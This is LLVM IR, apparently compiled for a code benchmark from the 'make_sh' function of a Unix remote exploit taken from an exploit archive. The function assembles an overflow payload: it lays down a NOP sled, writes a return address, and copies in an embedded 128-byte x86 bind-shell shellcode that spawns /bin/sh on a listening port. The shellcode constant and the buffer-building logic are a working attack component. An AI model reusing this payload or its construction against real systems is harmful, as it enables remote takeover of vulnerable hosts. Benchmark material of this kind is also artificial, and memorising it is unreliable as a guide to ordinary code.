; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22449.c_make_sh.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22449.c_make_sh.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@D_M = common dso_local global i32 0, align 4
@__const.make_sh.shell_code_bind_36864 = private unnamed_addr constant [128 x i8] c"\EBr^)\C0\89F\10@\89\C3\89F\0C@\89F\08\8DN\08\B0f\CD\80C\C6F\10\10f\89^\14\88F\08)\C0\89\C2\89F\18\B0\90f\89F\16\8DN\14\89N\0C\8DN\08\B0f\CD\80\89^\0CCC\B0f\CD\80\89V\0C\89V\10\B0fC\CD\80\86\C3\B0?)\C9\CD\80\B0?A\CD\80\B0?A\CD\80\88V\07\89v\0C\87\F3\8DK\0C\B0\0B\CD\80\E8\89\FF\FF\FF/bin/sh", align 16
@NOP_NOP_PSH = common dso_local global i8 0, align 1
@NULL_NULL_PSH = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @make_sh(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [128 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %9 = load i32, i32* @D_M, align 4
  store i32 %9, i32* %5, align 4
  %10 = load i32, i32* @D_M, align 4
  store i32 %10, i32* %6, align 4
  %11 = bitcast [128 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 getelementptr inbounds ([128 x i8], [128 x i8]* @__const.make_sh.shell_code_bind_36864, i32 0, i32 0), i64 128, i1 false)
  %12 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %13 = call i32 @memset(i8* %12, i32 0, i32 1024)
  %14 = load i32, i32* @D_M, align 4
  store i32 %14, i32* %6, align 4
  br label %15

15:                                               ; preds = %23, %2
  %16 = load i32, i32* %6, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %16, %17
  br i1 %18, label %19, label %26

19:                                               ; preds = %15
  %20 = load i32, i32* %6, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %21
  store i8 -112, i8* %22, align 1
  br label %23

23:                                               ; preds = %19
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  br label %15

26:                                               ; preds = %15
  %27 = load i32, i32* %3, align 4
  %28 = ashr i32 %27, 0
  %29 = and i32 %28, 255
  %30 = trunc i32 %29 to i8
  %31 = load i32, i32* %6, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %6, align 4
  %33 = sext i32 %31 to i64
  %34 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %33
  store i8 %30, i8* %34, align 1
  %35 = load i32, i32* %3, align 4
  %36 = ashr i32 %35, 8
  %37 = and i32 %36, 255
  %38 = trunc i32 %37 to i8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %6, align 4
  %41 = sext i32 %39 to i64
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %41
  store i8 %38, i8* %42, align 1
  %43 = load i32, i32* %3, align 4
  %44 = ashr i32 %43, 16
  %45 = and i32 %44, 255
  %46 = trunc i32 %45 to i8
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %6, align 4
  %49 = sext i32 %47 to i64
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %49
  store i8 %46, i8* %50, align 1
  %51 = load i32, i32* %3, align 4
  %52 = ashr i32 %51, 24
  %53 = and i32 %52, 255
  %54 = trunc i32 %53 to i8
  %55 = load i32, i32* %6, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %6, align 4
  %57 = sext i32 %55 to i64
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %57
  store i8 %54, i8* %58, align 1
  %59 = load i32, i32* %6, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %6, align 4
  %61 = sext i32 %59 to i64
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %61
  store i8 62, i8* %62, align 1
  %63 = load i32, i32* @D_M, align 4
  store i32 %63, i32* %5, align 4
  br label %64

64:                                               ; preds = %81, %26
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %68 = call i32 @strlen(i8* %67)
  %69 = sext i32 %68 to i64
  %70 = sub i64 1024, %69
  %71 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %72 = call i32 @strlen(i8* %71)
  %73 = sext i32 %72 to i64
  %74 = sub i64 %70, %73
  %75 = icmp ult i64 %66, %74
  br i1 %75, label %76, label %84

76:                                               ; preds = %64
  %77 = load i32, i32* %6, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %6, align 4
  %79 = sext i32 %77 to i64
  %80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %79
  store i8 -112, i8* %80, align 1
  br label %81

81:                                               ; preds = %76
  %82 = load i32, i32* %5, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %5, align 4
  br label %64

84:                                               ; preds = %64
  %85 = load i32, i32* @D_M, align 4
  store i32 %85, i32* %5, align 4
  br label %86

86:                                               ; preds = %100, %84
  %87 = load i32, i32* %5, align 4
  %88 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %89 = call i32 @strlen(i8* %88)
  %90 = icmp slt i32 %87, %89
  br i1 %90, label %91, label %103

91:                                               ; preds = %86
  %92 = load i32, i32* %5, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = load i32, i32* %6, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %6, align 4
  %98 = sext i32 %96 to i64
  %99 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 %98
  store i8 %95, i8* %99, align 1
  br label %100

100:                                              ; preds = %91
  %101 = load i32, i32* %5, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %5, align 4
  br label %86

103:                                              ; preds = %86
  %104 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %105 = call i32 @strdup(i8* %104)
  ret i32 %105
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @strdup(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
